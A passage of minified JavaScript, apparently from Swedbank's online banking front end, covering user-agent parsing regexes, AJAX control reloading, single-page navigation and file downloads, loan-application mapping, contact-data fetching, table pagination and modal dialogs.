b/i,/\b(dragon[- ]+touch |dt)(\w{5}) b/i],[["vendor","Dragon Touch"],"model",["type","tablet"]],[/\b(ns-?\w{0,9}) b/i],["model",["vendor","Insignia"],["type","tablet"]],[/\b((nxa|next)-?\w{0,9}) b/i],["model",["vendor","NextBook"],["type","tablet"]],[/\b(xtreme_)?(v(1[045]|2[015]|[3469]0|7[05])) b/i],[["vendor","Voice"],"model",["type","mobile"]],[/\b(lvtel\-)?(v1[12]) b/i],[["vendor","LvTel"],"model",["type","mobile"]],[/\b(ph-1) /i],["model",["vendor","Essential"],["type","mobile"]],[/\b(v(100md|700na|7011|917g).*\b) b/i],["model",["vendor","Envizen"],["type","tablet"]],[/\b(trio[-\w\. ]+) b/i],["model",["vendor","MachSpeed"],["type","tablet"]],[/\btu_(1491) b/i],["model",["vendor","Rotor"],["type","tablet"]],[/(shield[\w ]+) b/i],["model",["vendor","Nvidia"],["type","tablet"]],[/(sprint) (\w+)/i],["vendor","model",["type","mobile"]],[/(kin\.[onetw]{3})/i],[["model",/\./g," "],["vendor","Microsoft"],["type","mobile"]],[/droid.+; (cc6666?|et5[16]|mc[239][23]x?|vc8[03]x?)\)/i],["model",["vendor","Zebra"],["type","tablet"]],[/droid.+; (ec30|ps20|tc[2-8]\d[kx])\)/i],["model",["vendor","Zebra"],["type","mobile"]],[/(ouya)/i,/(nintendo) ([wids3utch]+)/i],["vendor","model",["type","console"]],[/droid.+; (shield) bui/i],["model",["vendor","Nvidia"],["type","console"]],[/(playstation [345portablevi]+)/i],["model",["vendor","Sony"],["type","console"]],[/\b(xbox(?: one)?(?!; xbox))[\); ]/i],["model",["vendor","Microsoft"],["type","console"]],[/smart-tv.+(samsung)/i],["vendor",["type","smarttv"]],[/hbbtv.+maple;(\d+)/i],[["model",/^/,"SmartTV"],["vendor","Samsung"],["type","smarttv"]],[/(nux; netcast.+smarttv|lg (netcast\.tv-201\d|android tv))/i],[["vendor","LG"],["type","smarttv"]],[/(apple) ?tv/i],["vendor",["model","Apple TV"],["type","smarttv"]],[/crkey/i],[["model","Chromecast"],["vendor","Google"],["type","smarttv"]],[/droid.+aft(\w)( bui|\))/i],["model",["vendor","Amazon"],["type","smarttv"]],[/\(dtv[\);].+(aquos)/i],["model",["vendor","Sharp"],["type","smarttv"]],[/\b(roku)[\dx]*[\)\/]((?:dvp-)?[\d\.]*)/i,/hbbtv\/\d+\.\d+\.\d+ +\([\w ]*; *(\w[^;]*);([^;]*)/i],[["vendor",v],["model",v],["type","smarttv"]],[/\b(android tv|smart[- ]?tv|opera tv|tv; rv:)\b/i],[["type","smarttv"]],[/((pebble))app/i],["vendor","model",["type","wearable"]],[/droid.+; (glass) \d/i],["model",["vendor","Google"],["type","wearable"]],[/droid.+; (wt63?0{2,3})\)/i],["model",["vendor","Zebra"],["type","wearable"]],[/(quest( 2)?)/i],["model",["vendor","Facebook"],["type","wearable"]],[/(tesla)(?: qtcarbrowser|\/[-\w\.]+)/i],["vendor",["type","embedded"]],[/droid .+?; ([^;]+?)(?: bui|\) applew).+? mobile safari/i],["model",["type","mobile"]],[/droid .+?; ([^;]+?)(?: bui|\) applew).+?(?! mobile) safari/i],["model",["type","tablet"]],[/\b((tablet|tab)[;\/]|focus\/\d(?!.+mobile))/i],[["type","tablet"]],[/(phone|mobile(?:[;\/]| safari)|pda(?=.+windows ce))/i],[["type","mobile"]],[/(android[-\w\. ]{0,9});.+buil/i],["model",["vendor","Generic"]]],engine:[[/windows.+ edge\/([\w\.]+)/i],["version",["name","EdgeHTML"]],[/webkit\/537\.36.+chrome\/(?!27)([\w\.]+)/i],["version",["name","Blink"]],[/(presto)\/([\w\.]+)/i,/(webkit|trident|netfront|netsurf|amaya|lynx|w3m|goanna)\/([\w\.]+)/i,/ekioh(flow)\/([\w\.]+)/i,/(khtml|tasman|links)[\/ ]\(?([\w\.]+)/i,/(icab)[\/ ]([23]\.[\d\.]+)/i],["name","version"],[/rv:([\w\.]{1,9})\b.+(gecko)/i],["version","name"]],os:[[/microsoft (windows) (vista|xp)/i],["name","version"],[/(windows) nt 6\.2; (arm)/i,/(windows (?:phone(?: os)?|mobile))[\/ ]?([\d\.\w ]*)/i,/(windows)[\/ ]?([ntce\d\. ]+\w)(?!.+xbox)/i],["name",["version",w,A]],[/(win(?=3|9|n)|win 9x )([nt\d\.]+)/i],[["name","Windows"],["version",w,A]],[/ip[honead]{2,4}\b(?:.*os ([\w]+) like mac|; opera)/i,/cfnetwork\/.+darwin/i],[["version",/_/g,"."],["name","iOS"]],[/(mac os x) ?([\w\. ]*)/i,/(macintosh|mac_powerpc\b)(?!.+haiku)/i],[["name","Mac OS"],["version",/_/g,"."]],[/droid ([\w\.]+)\b.+(android[- ]x86)/i],["version","name"],[/(android|webos|qnx|bada|rim tablet os|maemo|meego|sailfish)[-\/ ]?([\w\.]*)/i,/(blackberry)\w*\/([\w\.]*)/i,/(tizen|kaios)[\/ ]([\w\.]+)/i,/\((series40);/i],["name","version"],[/\(bb(10);/i],["version",["name","BlackBerry"]],[/(?:symbian ?os|symbos|s60(?=;)|series60)[-\/ ]?([\w\.]*)/i],["version",["name","Symbian"]],[/mozilla\/[\d\.]+ \((?:mobile|tablet|tv|mobile; [\w ]+); rv:.+ gecko\/([\w\.]+)/i],["version",["name","Firefox OS"]],[/web0s;.+rt(tv)/i,/\b(?:hp)?wos(?:browser)?\/([\w\.]+)/i],["version",["name","webOS"]],[/crkey\/([\d\.]+)/i],["version",["name","Chromecast"]],[/(cros) [\w]+ ([\w\.]+\w)/i],[["name","Chromium OS"],"version"],[/(nintendo|playstation) ([wids345portablevuch]+)/i,/(xbox); +xbox ([^\);]+)/i,/\b(joli|palm)\b ?(?:os)?\/?([\w\.]*)/i,/(mint)[\/\(\) ]?(\w*)/i,/(mageia|vectorlinux)[; ]/i,/([kxln]?ubuntu|debian|suse|opensuse|gentoo|arch(?= linux)|slackware|fedora|mandriva|centos|pclinuxos|red ?hat|zenwalk|linpus|raspbian|plan 9|minix|risc os|contiki|deepin|manjaro|elementary os|sabayon|linspire)(?: gnu\/linux)?(?: enterprise)?(?:[- ]linux)?(?:-gnu)?[-\/ ]?(?!chrom|package)([-\w\.]*)/i,/(hurd|linux) ?([\w\.]*)/i,/(gnu) ?([\w\.]*)/i,/\b([-frentopcghs]{0,5}bsd|dragonfly)[\/ ]?(?!amd|[ix346]{1,2}86)([\w\.]*)/i,/(haiku) (\w+)/i],["name","version"],[/(sunos) ?([\w\.\d]*)/i],[["name","Solaris"],"version"],[/((?:open)?solaris)[-\/ ]?([\w\.]*)/i,/(aix) ((\d)(?=\.|\)| )[\w\.])*/i,/\b(beos|os\/2|amigaos|morphos|openvms|fuchsia|hp-ux)/i,/(unix) ?([\w\.]*)/i],["name","version"]]},h=function(a,d){if("object"==typeof a&&(d=a,a=g),!(this instanceof h))return new h(a,d).getResult();var c=a||(void 0!==l&&l.navigator&&l.navigator.userAgent?l.navigator.userAgent:""),f=d?function(a,d){var f,c={};for(f in a)c[f]=d[f]&&0==d[f].length%2?d[f].concat(a[f]):a[f];return c}(B,d):B;return this.getBrowser=function(){var b={};b.name=g,b.version=g,q.call(b,c,f.browser);var m=b.version;return m="string"==typeof m?m.replace(/[^\d\.]/g,"").split(".")[0]:g,b.major=m,b},this.getCPU=function(){var b={};return b.architecture=g,q.call(b,c,f.cpu),b},this.getDevice=function(){var b={};return b.vendor=g,b.model=g,b.type=g,q.call(b,c,f.device),b},this.getEngine=function(){var b={};return b.name=g,b.version=g,q.call(b,c,f.engine),b},this.getOS=function(){var b={};return b.name=g,b.version=g,q.call(b,c,f.os),b},this.getResult=function(){return{ua:this.getUA(),browser:this.getBrowser(),engine:this.getEngine(),os:this.getOS(),device:this.getDevice(),cpu:this.getCPU()}},this.getUA=function(){return c},this.setUA=function(b){return c="string"==typeof b&&255<b.length?v(b,255):b,this},this.setUA(c),this};h.VERSION="1.0.2",h.BROWSER=r(["name","version","major"]),h.CPU=r(["architecture"]),h.DEVICE=r("model vendor type console mobile smarttv tablet wearable embedded".split(" ")),h.ENGINE=h.OS=r(["name","version"]),"undefined"!=typeof exports?("undefined"!=typeof module&&module.exports&&(exports=module.exports=h),exports.UAParser=h):"function"==typeof define&&define.amd?define((function(){return h})):void 0!==l&&(l.UAParser=h);var n=void 0!==l&&(l.jQuery||l.Zepto);if(n&&!n.ua){var u=new h;n.ua=u.getResult(),n.ua.get=function(){return u.getUA()},n.ua.set=function(a){for(var d in u.setUA(a),a=u.getResult())n.ua[d]=a[d]}}}("object"==typeof window?window:this);var Controls={shadowContainer:null,applyShadowing:function(e,ignoreLoading){if(null!=e){var $element="string"==typeof e?jQuery("#"+e):jQuery(e),shadowElement=Controls.getShadowElement($element),zIndex=null==$element?1e4:Number($element.zIndex())+1;shadowElement.zIndex(zIndex),ignoreLoading||(jQuery("html").addClass("-loading"),jQuery(shadowElement).addClass("-loading"))}},removeShadowing:function(ignoreLoading){null!=Controls.shadowContainer&&Controls.shadowContainer.hide(),ignoreLoading||(jQuery("html").removeClass("-loading"),jQuery(Controls.shadowContainer).removeClass("-loading"))},reloadControl:function(container,controlId,params,userCallbacks,exceptionContainerId){var callbacks={onFailure:function(){},onRefresh:function(){}};jQuery.extend(callbacks,userCallbacks||{});var parameters={controlId:controlId,pageId:"controls"};jQuery.extend(parameters,params||{});var $container=jQuery("#"+container);Controls.applyShadowing($container),makeAjaxRequest(document.mainForm,parameters,(function(transport){Controls.removeShadowing();var json=transport.responseJSON;if(null!=json&&json.exception){void 0!==parameters.exceptionContainerTarget&&($container=jQuery("#"+parameters.exceptionContainerTarget));var exceptionsContainer=$container.find(null!=exceptionContainerId?exceptionContainerId:"._exceptionsContainer").first();exceptionsContainer&&(exceptionsContainer.show(),exceptionsContainer.html(json.exception),callbacks.onFailure(json))}else"CommunicationControl"===controlId&&([].forEach.call(document.querySelectorAll("ui-navtoggle"),(function(toggle){toggle.active&&(toggle.animated=!1)})),SharedComponents.eventBus.dispatchCustomEvent("menu-toggle",{active:!1})),$container.html(""),$container.replaceWith(transport.responseText),callbacks.onRefresh()}))},executeControl:function(container,controlId,params,userCallbacks,exceptionContainerId,ignoreLoading){var callbacks={onFailure:function(json){},onSuccess:function(transport){}};jQuery.extend(callbacks,userCallbacks||{});var parameters={controlId:controlId,pageId:"controls"};jQuery.extend(parameters,params||{});var $container=jQuery("#"+container);$container&&(Controls.applyShadowing($container,ignoreLoading),makeAjaxRequest(document.mainForm,parameters,(function(transport){Controls.removeShadowing(ignoreLoading);var json=transport.responseJSON;if(null!=json&&json.exception){var exceptionsContainer=$container.find(null!=exceptionContainerId?exceptionContainerId:"._exceptionsContainer").first();exceptionsContainer&&(exceptionsContainer.show(),exceptionsContainer.html(json.exception)),callbacks.onFailure(json)}else callbacks.onSuccess(transport)})))},executeJsonControl:function(container,controlId,params,config){var configuration={onFailure:function(json){},onSuccess:function(json){}};Object.extend(configuration,config||{});var parameters={controlId:controlId,pageId:"controls"};jQuery.extend(parameters,params||{});var $container=jQuery("#"+container);Controls.applyShadowing($container),makeAjaxRequest(document.mainForm,parameters,(function(transport){Controls.removeShadowing();var json=transport.responseJSON;null!=json&&json.errors?(configuration.onFailure(json),jQuery(json.errors).each((function(){ErrorMessage.add(this.message)}))):(configuration.onSuccess(json),jQuery(json.warnings).each((function(){WarningMessage.add(this.toString())})),jQuery(json.messages).each((function(){SuccessMessage.add(this.toString())})),jQuery(json.infos).each((function(){InfoMessage.add(this.toString())})))}),{headers:{accept:"application/vnd.swedbank+json;version=2"}})},getShadowElement:function(e){var position=null!=e&&e.offset(),callerVisible=!1;position&&(callerVisible=position.left>0&&position.top>0);var shadowContainer=Controls.shadowContainer;if(null==shadowContainer){shadowContainer=jQuery("<div/>",{class:"loading-control"});jQuery("<ins/>",{class:"loader"});jQuery(document.body).append(shadowContainer)}else shadowContainer.show();return callerVisible?jQuery(shadowContainer).offset(position):shadowContainer.addClass("-shadow-loading"),Controls.shadowContainer=shadowContainer,shadowContainer}};!function($){if(Swedbank.isUiSpaEnabled)return;const FORMDATA_USABLE="function"==typeof FormData.prototype.set;var originalActions={navigateTo:window.navigateTo,doSubmit:window.doSubmit,runLinkAction:window.runLinkAction,Navigate:{to:window.Navigate.to}},spaActions={navigateTo:function(pageId,paramName1,paramValue1,paramName2,paramValue2){var params={pageId:pageId||Swedbank.Navigation.pageId,field1:paramName1,value1:paramValue1,field2:paramName2,value2:paramValue2};setPageId(document.navForm,pageId),spaAjax(document.navForm,params,!1)},doSubmit:function(control,pageId,paramValue1,paramName2,paramValue2){var params={pageId:pageId||Swedbank.Navigation.pageId,field1:control?control.name:void 0,value1:isEmpty(paramValue1)?"true":paramValue1,field2:paramName2,value2:paramValue2};spaAjax(document.mainForm,params,!0)},runLinkAction:function(form,pageId,paramName1,paramValue1,paramName2,paramValue2,anchor){spaAjax(form,{pageId:pageId||Swedbank.Navigation.pageId,field1:paramName1,value1:isEmpty(paramValue1)?paramName1:paramValue1,field2:paramName2,value2:isEmpty(paramValue2)?paramName2:paramValue2},!0,anchor)},Navigate:{to:function(pageId,params,form){spaAjax(form||document.navForm,$.extend(params,{pageId:pageId}),form!==document.navForm)}}},dynamicActions={navigateTo:function(){return methodCall("navigateTo",document.navForm,arguments)},doSubmit:function(){return methodCall("doSubmit",document.mainForm,arguments)},runLinkAction:function(){return methodCall("runLinkAction",arguments[0],arguments)},Navigate:{to:function(){return methodCall("Navigate.to",arguments[2]||document.navForm,arguments)}}};function spaAjax(form,params,checkReadyness,anchor){if(HTMLCollection.prototype.isPrototypeOf(form)&&(Swedbank.warn("HTMLFormElement is expected but HTMLCollection is given as a form. The last element from the collection is going to be taken as a form instead of whole collection"),form=form[form.length-1]),TimeoutNotifier.prolongSessionWithoutRequest(),!(form.validator?!form.checkValidity():"function"==typeof $(form).valid&&$(form).hasClass(".jquery-form-validation")&&!$(form).valid())){if(checkReadyness){if(!readyToSubmit())return;setSubmitTime()}null!==Swedbank.chatStartable&&(Swedbank.chatStartable=!1),function binaryAwareRequest(){Swedbank.toggleLoader(!0);var xhr=new XMLHttpRequest;xhr.open("POST",form.action,!0),xhr.setRequestHeader("X-Single-Page-Navigation","true"),xhr.responseType="arraybuffer",xhr.onload=function onLoad(){Swedbank.toggleLoader(!1),window.lastSubmitTime=0,200===this.status&&(xhr.getResponseHeader("Content-Type").startsWith("text/html")?function handleAsTextWith(callback){var blob=new Blob([xhr.response],{type:xhr.getResponseHeader("Content-Type")}),reader=new FileReader;reader.onload=function(){callback(reader.result)},reader.readAsText(blob)}(updatePageContent):function handleFileDownload(xhr){var filename="",disposition=xhr.getResponseHeader("Content-Disposition");if(disposition&&-1!==disposition.indexOf("attachment")){var matches=/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(disposition);null!=matches&&matches[1]&&(filename=matches[1].replace(/['"]/g,""))}var contentType=xhr.getResponseHeader("Content-Type"),blob=/Edge/.test(navigator.userAgent)||"function"!=typeof File?new Blob([xhr.response],{type:contentType}):new File([xhr.response],filename,{type:contentType});if(void 0!==window.navigator.msSaveOrOpenBlob)window.navigator.msSaveOrOpenBlob(blob,filename);else{var a,URL=window.URL||window.webkitURL,downloadUrl=URL.createObjectURL(blob);filename?void 0===(a=document.createElement("a")).download?window.location=downloadUrl:(a.href=downloadUrl,a.download=filename,document.body.appendChild(a),a.click()):window.location=downloadUrl,setTimeout((function(){URL.revokeObjectURL(downloadUrl),a&&a.parentNode&&a.parentNode.removeChild(a)}),100)}}(xhr))},function sendRequest(){var data;FORMDATA_USABLE?(data=function creteFormData(){var $emptyFileFields=$(form).find("input[type=file]:not([disabled])").filter((function(i,e){return""===$(e).val()}));$emptyFileFields.attr("disabled",!0);var formData=new FormData(form);return formData.append("navigation_timestamp",(new Date).toString()),$emptyFileFields.attr("disabled",!1),formData}(),$.each(params,(function(key,value){data.set(key,value)}))):(xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"),data=$.param($.extend($(form).serializeObject(),params))),xhr.send(data)}()}()}function updatePageContent(resp){Swedbank.PageLoad.prepareForPageLoad(),function updateReferrer(){Swedbank.Navigation.referrer=window.location.href}(),function updateLastPageId(){Swedbank.Navigation.lastPageId=Swedbank.Navigation.pageId}(),null!==Swedbank.chatStartable&&(Swedbank.chatStartable=!0),void 0!==Swedbank.canCheckProactiveChatState&&(jQuery(document).ready(clearProactiveTimeouts),Swedbank.canCheckProactiveChatState&&jQuery(document).ready(checkProactiveChatState));var $response=$(resp);!function moveToHead(selector){var $elements=$response.appendTo("<div/>").parent().find(selector).detach();if($elements.length){var $pageHead=$("head");$pageHead.find(selector).remove(),$pageHead.append($elements),$response=$elements.end().children()}}("meta,title");var $content=$("#content"),mainNav=document.getElementById("nav-main"),spoeBar=document.querySelector("spoe-bar");anchor||window.scrollTo(0,0),$content.html($response),function changeHistoryState(){if(!function isComingFromPopState(params){return history.state===params}(params)){var url=Swedbank.Navigation.url;anchor&&(url+="#"+anchor),history.pushState({pageId:params.pageId},Swedbank.Navigation.pageId,url)}}(),Swedbank.PageLoad.pageLoaded(),spoeBar&&spoeBar.rebuildSPOEBar(),Swedbank.User&&SharedComponents.eventBus.dispatchCustomEvent("update-spoe"),mainNav&&mainNav.selectMenuItemById(Swedbank.Navigation.pageId)}}function getActionsObject(targetPageId,hasTarget,form){return!FORMDATA_USABLE&&$(form).find(":file").length||hasTarget?originalActions:function isSpaCompatible(pageId){if(!pageId)return!1;var node,parts=pageId.split("."),nodes=[Swedbank.Menu.menuStructure],depth=0,currentPath=parts[depth],isSpa=!1;for(;;){if(!(node=nodes.filter((o=>o.id===currentPath))[0]))return!1;if(isSpa=!0===node.spa||!1===node.spa?node.spa:isSpa,node.id==pageId||!node.children||++depth>=parts.length)return isSpa;currentPath+="."+parts[depth],nodes=node.children}}(targetPageId||Swedbank.Navigation.pageId)?spaActions:originalActions}function methodCall(name,form,args){var pageId,isDoSubmit="doSubmit"==name,isRunLinkAction="runLinkAction"==name;function lookupPageIdAtIndex(index){"pageId"==args[index]&&fixAndSetPageId(index+1)}function fixAndSetPageId(fromIndex){pageId=args[fromIndex]=(args[fromIndex]||"").replace(/\//g,".")}fixAndSetPageId(isDoSubmit||isRunLinkAction?1:0),pageId||(isRunLinkAction?(lookupPageIdAtIndex(2),lookupPageIdAtIndex(4)):(lookupPageIdAtIndex(1),lookupPageIdAtIndex(3)));var hasTarget=!!args[isDoSubmit?5:isRunLinkAction?7:6],actionsObject=getActionsObject(pageId,hasTarget,form);if(-1!==name.indexOf(".")){for(var parts=name.split("."),i=0;i<parts.length-1;i++)actionsObject=actionsObject[parts[i]];name=parts[parts.length-1]}return actionsObject[name].apply(null,args)}Swedbank.SPA={switchSinglePageMode:function(flag){$.extend(!0,window,flag?dynamicActions:originalActions)},OriginalActions:originalActions},function handleHistoryPopstate(){window.onpopstate=function(event){if(null===event.state&&document.location.href.indexOf("#")>-1)return event.preventDefault(),!1;!function isCreatedWithSpa(){return null!==history.state}()?location.reload():spaAjax(document.navForm,history.state,!1)}}(),Swedbank.PageLoad.onEachUnload((function(){$("table").stickyTableHeaders("destroy"),$.datepicker&&$.datepicker.initialized&&($(document).off("mousedown",$.datepicker._checkExternalClick),$.datepicker.initialized=!1),"undefined"!=typeof Highcharts&&(Highcharts.charts&&Highcharts.charts.forEach((chart=>{chart&&chart.destroy()})),Highcharts=HighchartsAdapter=void 0),"undefined"!=typeof ChartsComponents&&ChartsComponents.Highcharts&&ChartsComponents.Highcharts.charts&&ChartsComponents.Highcharts.charts.forEach((chart=>{chart&&chart.destroy()})),Swedbank.PageConfig={};try{const cookieConsent=Swedbank.UICookies.getConsentElem();cookieConsent.destroyUnwantedCookies(),cookieConsent.destroyUnwantedStorage()}catch(e){}$(document).off("touchstart.jcrop-ios"),"function"==typeof $.fn.parallax&&$('[data-parallax="scroll"]').parallax("destroy")}))}(jQuery),Swedbank.ip={paymentsListPageLink:"",allAccountsData:[],currency:[],currencyField:[],labels:{},isBalanceVisible:"",countries:[],multipleAccounts:!1,creditorAccountName:"",preparedResult:"",smartPaymentLastTrxStatus:"",countryLocale:"",addDebugData:!1,askPassword:!1,showError:function(messageLabel){var errorMsg=this.setErrorMessage(messageLabel);jQuery("#errorMessageBox").show(),jQuery("#errorMessage").addClass("errorMsg").html(errorMsg),window.location.hash="#errorMessage"},setErrorMessage:function(messageLabel){return'<label id="error-msg">'+messageLabel+"</label>"},hideAllMessages:function(){jQuery("#error-msg").remove(),jQuery("#errorMessageBox").hide()},setAllAccountsData:function(data){this.allAccountsData=JSON.parse(data)},setLabels:function(labels){jQuery.extend(this.labels,labels)}},Swedbank.LoanApplication=class{static application(app){return{"small-loan":{type:"LT"===Swedbank.country?"CONSUMER_LOAN_QUICK":"SMALL_LOAN",prevType:"LT"===Swedbank.country?"CONSUMER_LOAN_QUICK":"SMALL_LOAN"},"home-small-loan":{type:"LT"===Swedbank.country?"CONSUMER_LOAN_QUICK":"SMALL_LOAN",prevType:"LT"===Swedbank.country?"CONSUMER_LOAN_QUICK":"SMALL_LOAN"},"home-loan":{type:"LV"===Swedbank.country?"MORTGAGE_LOAN":"HOUSING_LOAN",prevType:"LV"===Swedbank.country?"MORTGAGE_LOAN":"HOUSING_LOAN"},"credit-line":{type:"PCL",prevType:"PCL"},"car-lease":{type:"CAR_LEASE",prevType:"CAR_LEASE"},"car-loan":{type:"LT"===Swedbank.country?"CONSUMER_LOAN_QUICK":"SMALL_LOAN",prevType:"LT"===Swedbank.country?"CONSUMER_LOAN_QUICK":"SMALL_LOAN"}}[app]}static submitLoanApp(pageId,params){const mainForm=document.mainForm;params.application&&(params.type=params.application.type,params.prevType=params.application.prevType,delete params.application),params.infoAtBegin=!0,setPageId(mainForm,pageId),_fillForm(mainForm,params),mainForm.submit()}},Swedbank.ContactData=class{static get ACTION(){return"getMdmContactInformationAsJson"}static get PAGE_ID(){return"private.home.important.aml"}static get restService(){return Swedbank.RestService.get()}static get fetchAllowed(){return Swedbank.isAuthenticated&&Swedbank.Navigation.isPrivate()}static async fetchContacts(){return this.fetchAllowed?await this.restService.callAction(this.ACTION,{pageId:this.PAGE_ID}).then((response=>response.contactInformation)).catch((()=>{})):{}}static async getContacts(){const contacts=await Swedbank.ContactData.fetchContacts();return{email:contacts.email||"",phone:contacts.primaryPhoneNumber||""}}static async getEmail(){return(await Swedbank.ContactData.getContacts()).email||""}static async getPhone(){return(await Swedbank.ContactData.getContacts()).phone||""}},Swedbank.SimpleTablePagination=class SimpleTablePagination{constructor(pagination,table){pagination&&table?(SimpleTablePagination.pagination=pagination,SimpleTablePagination.table=table,SimpleTablePagination.tableRows.length<=SimpleTablePagination.pageSize?SimpleTablePagination.pagination.hide():SimpleTablePagination.pagination.show(),SimpleTablePagination.setTableRowsDataAttributes(),SimpleTablePagination.pagination.addEventListener("change",SimpleTablePagination.paginationListener)):console.error("Pagination or table element is missing.")}static set pagination(pagination){this._pagination=pagination}static get pagination(){return this._pagination}static set table(table){this._table=table}static get table(){return this._table}static get pageSize(){return SimpleTablePagination.pagination.pageSize}static get tableRows(){return SimpleTablePagination.table.querySelectorAll("tbody tr")}static setTableRowsDataAttributes(){let page=1;this.tableRows.forEach(((row,index)=>{index<SimpleTablePagination.pageSize?row.dataset.page=page.toString():(index%SimpleTablePagination.pageSize==0&&page++,row.dataset.page=page.toString(),UI.hide(row))}))}static paginationListener(event){const currentPage=event.detail.currentPage;SimpleTablePagination.pagination.currentPage=currentPage,SimpleTablePagination.pagination.pageSize=event.detail.pageSize,SimpleTablePagination.setTableRowsDataAttributes(),SimpleTablePagination.setTableRowsVisibility(currentPage)}static setTableRowsVisibility(currentPage){this.tableRows.forEach((row=>currentPage===+row.dataset.page?UI.show(row):UI.hide(row)))}},SharedComponents.eventBus.addEventListener("spa-navigation-start",(()=>Swedbank.toggleLoader(!0))),SharedComponents.eventBus.addEventListener("spa-navigation-complete",(()=>Swedbank.toggleLoader(!1))),SharedComponents.eventBus.addEventListener("spa-navigation-failed",(()=>Swedbank.toggleLoader(!1))),SharedComponents.eventBus.addEventListener("loading-start",(()=>Swedbank.toggleLoader(!0))),SharedComponents.eventBus.addEventListener("loading-complete",(()=>Swedbank.toggleLoader(!1))),SharedComponents.eventBus.addEventListener("application-changed",(()=>Swedbank.toggleLoader(!0))),SharedComponents.eventBus.addEventListener("language-changed",(()=>Swedbank.toggleLoader(!0))),Swedbank.UIAwards=class{static get sortStatus(){return{YES:"yes",NO:"no"}}constructor(container,modal,filterElem=null,curtain=null){if(!container)throw new Error("First argument should be HTMLElement container.");if(!modal)throw new Error("Second argument should be UIModal element.");this.container=container,this.modal=modal,this.filterElem=filterElem,this.curtain=curtain,this.offers=this.container.querySelectorAll("ui-award"),this.views=this.modal.querySelector("ui-views"),this.details=this.modal.querySelector("ui-awarddetails"),this.filtered=!1,this.index=0}setupDetailsModal(){const parentTab=this.container.closest("ui-tab");if(parentTab&&parentTab.hasAttribute("label-badge")&&(parentTab.labelBadge=String(this.offers.length)),this.container.addEventListener("award-open",this._handleFeatureOpen.bind(this)),this.details.prevBtn.addEventListener("click",this._handlePrev.bind(this)),this.details.nextBtn.addEventListener("click",this._handleNext.bind(this)),this.filterElem){const checkboxes=this.filterElem.querySelectorAll('[type="checkbox"]');[].forEach.call(checkboxes,(checkbox=>{const value=checkbox.value,sum=this.container.querySelectorAll(`ui-award[data-${this.filterElem.dataset.sortBy}*="${value}"]`).length,counterElem=this.container.querySelector(`span[data-count-label="${value}"]`);checkbox.dataset.count=String(sum),sum>0&&counterElem?UI.setInnerText(counterElem,`(${sum})`):UI.hide(checkbox.parentElement),checkbox.addEventListener("click",this.filtrate.bind(this))})),[].filter.call(checkboxes,(c=>c.checked)).length>0&&this.filtrate()}}_handleFeatureOpen(event){const award=event.target,link=award.getInnerLink();link&&link.href||(this.index=award.awardId,this.views.selectByIndex(this.index),this._handleButtonsDisplay(),this.modal.open())}_handleButtonsDisplay(){this.filtered?(this.details.nextBtn.disabled=!this.views.querySelector("ui-view:nth-child("+(this.index+1)+') ~ ui-view[data-sorted="yes"]'),this.details.prevBtn.disabled=this.views.querySelector("ui-view:nth-child("+(this.index+1)+")")===this.views.querySelector('ui-view[data-sorted="yes"]')):(this.details.nextBtn.disabled=this.index===this.views.children.length-1,this.details.prevBtn.disabled=0===this.index)}_handlePrev(event){if(event.preventDefault(),this.filtered)for(;--this.index&&this.index>=0&&this.views.children[this.index].dataset.sorted!==Swedbank.UIAwards.sortStatus.YES;);else this.index--;this.views.selectByIndex(this.index),this._handleButtonsDisplay()}_handleNext(event){if(event.preventDefault(),this.filtered)for(;++this.index<this.views.children.length&&this.views.children[this.index].dataset.sorted!==Swedbank.UIAwards.sortStatus.YES;);else this.index++;this.views.selectByIndex(this.index),this._handleButtonsDisplay()}filtrate(){const checkedBoxes=this.filterElem.querySelectorAll('[type="checkbox"]:checked'),values=[].map.call(checkedBoxes,(c=>c.value)),allAwards=this.container.querySelectorAll("ui-award");[].forEach.call(allAwards,(award=>{const view=this.views.children[award.awardId];let matched=0===values.length;for(let i=0;i<values.length;i++)if(award.dataset[this.filterElem.dataset.sortBy].includes(values[i])){matched=!0;break}matched?(award.show(),view.dataset.sorted=Swedbank.UIAwards.sortStatus.YES):(award.hide(),view.dataset.sorted=Swedbank.UIAwards.sortStatus.NO)})),this.filtered=values.length>0,this.curtain&&!this.curtain.open&&this.curtain.activate()}},Swedbank.UIModals={open:function(modalId,params){var _params=params||{},modal=document.getElementById(modalId);if(modal){if(modal.classList.add("-legacy"),!modal.querySelector(".modal-messages")){var modalBody=modal.querySelector(".ui-modal__body");modalBody&&modalBody.insertAdjacentHTML("afterbegin",'<div class="modal-messages"><div id="modalErrorMessagesContainer" style="display:none" class="error-message-container"><div id="modalErrorMessage"></div></div><div id="modalLoginErrorMessagesContainer" style="display:none" class="error-message-container"><div id="modalLoginErrorMessage"></div></div><div id="modalWarningMessagesContainer" style="display:none" class="warning-message-container"><div id="modalWarningMessage"></div></div><div id="modal-login-error" style="display:none" class="warning-message-container"><div id="modal-login-warning"></div></div><div id="modalInfoMessagesContainer" style="display:none" class="info-message-container"><div id="modalInfoMessage"></div></div><div id="modalSuccessMessagesContainer" style="display:none" class="success-message-container"><div id="modalSuccessMessage"></div></div></div>')}UI.dispatchCustomEvent(document.body,"modal-open",{selector:"#"+modalId,params:_params})}else console.error("Modal with id "+modalId+" does not exists")},close:function(modalId){document.getElementById(modalId).close()},closeActive:function(){UI.dispatchCustomEvent(document.body,"modal-close-top")},alert:function(title,options){return(options=Object.assign({description:null,trustedSource:!1},options||{})).trustedSource&&(title=UI.createElement({tagName:"div",children:[title]},!0),options.description&&(options.description=UI.createElement({tagName:"div",children:[options.description]},!0))),new Promise((function(){UI.dispatchCustomEvent(document.body,"modal-open",{type:"alert",content:{title:title,description:options.description}})}))},confirm:function(title,options){return(options=Object.assign({description:null,showCloseAction:!1,trustedSource:!1,buttons:"yesNo"},options||{})).trustedSource&&(title=UI.createElement({tagName:"div",children:[title]},!0),options.description&&(options.description=UI.createElement({tagName:"div",children:[options.description]},!0))),new Promise((function(resolve){UI.dispatchCustomEvent(document.body,"modal-open",{type:"confirmation",content:{title:title,description:options.description},params:{compact:!options.showCloseAction,attributes:getConfirmationButtons(),onAction:function(e){let modal=e.target;switch(e.detail.type){case"accept":resolve(),modal.close();break;case"decline":modal.close()}}}})}));function getConfirmationButtons(){let buttons=options.buttons;return SharedComponents.helpers.isPlainObject(buttons)&&"label-accept"in buttons&&"label-decline"in 